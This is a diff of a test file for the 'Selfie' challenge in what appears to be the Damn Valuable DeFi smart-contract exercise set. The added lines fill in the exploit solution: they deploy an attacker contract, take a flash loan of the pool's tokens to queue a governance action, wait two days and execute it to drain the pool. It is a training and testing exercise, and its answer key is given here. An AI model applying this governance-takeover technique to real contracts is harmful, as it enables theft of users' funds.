@@ -3,6 +3,7 @@ const { accounts, contract } = require('@openzeppelin/test-environment');
 
 const DamnValuableTokenSnapshot = contract.fromArtifact('DamnValuableTokenSnapshot');
 const SelfiePool = contract.fromArtifact('SelfiePool');
+const SelfiePoolAttacker = contract.fromArtifact('SelfiePoolAttacker');
 const SimpleGovernance = contract.fromArtifact('SimpleGovernance');
 
 const { expect } = require('chai');
@@ -13,7 +14,7 @@ describe('[Challenge] Selfie', function () {
 
     const TOKEN_INITIAL_SUPPLY = ether('2000000')
     const TOKENS_IN_POOL = ether('1500000');
-    
+
 
     before(async function () {
         /** SETUP SCENARIO */
@@ -21,7 +22,7 @@ describe('[Challenge] Selfie', function () {
         this.governance = await SimpleGovernance.new(this.token.address, { from: deployer });
         this.pool = await SelfiePool.new(
             this.token.address,
-            this.governance.address, 
+            this.governance.address,
             { from: deployer }
         );
 
@@ -34,13 +35,17 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        const helper = await SelfiePoolAttacker.new({ from: attacker });
+        await helper.attack(this.pool.address, TOKENS_IN_POOL.toString(), { from: attacker });
+        await time.increase(time.duration.days(2));
+        await this.governance.executeAction(1, { from: attacker });
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
         expect(
             await this.token.balanceOf(attacker)
-        ).to.be.bignumber.equal(TOKENS_IN_POOL);        
+        ).to.be.bignumber.equal(TOKENS_IN_POOL);
         expect(
             await this.token.balanceOf(this.pool.address)
         ).to.be.bignumber.equal('0');
